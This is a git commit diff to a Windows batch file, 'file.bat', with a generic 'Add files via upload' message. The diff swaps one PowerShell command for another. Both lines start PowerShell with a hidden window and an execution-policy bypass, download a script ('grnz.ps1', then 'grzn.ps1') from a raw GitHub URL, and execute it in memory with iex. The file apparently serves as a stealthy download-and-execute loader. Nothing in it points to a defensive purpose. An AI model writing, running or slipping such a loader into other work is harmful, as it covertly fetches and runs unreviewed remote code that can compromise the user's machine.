2cf932b012dc5e525b51b36d939f5c42151a130e
engine34r <ppooker@tutamail.com>
2025-09-01 07:49:40 +0000

    Add files via upload

--- file.bat
+++ file.bat
@@ -1,6 +1,6 @@
 @echo off
 setlocal
 
-powershell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -c "iex (iwr 'https://raw.githubusercontent.com/engine34r/knocker/main/grnz.ps1' -UseBasicParsing).Content"
+powershell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -c "iex (iwr 'https://raw.githubusercontent.com/engine34r/knocker/main/grzn.ps1' -UseBasicParsing).Content"
 
 endlocal
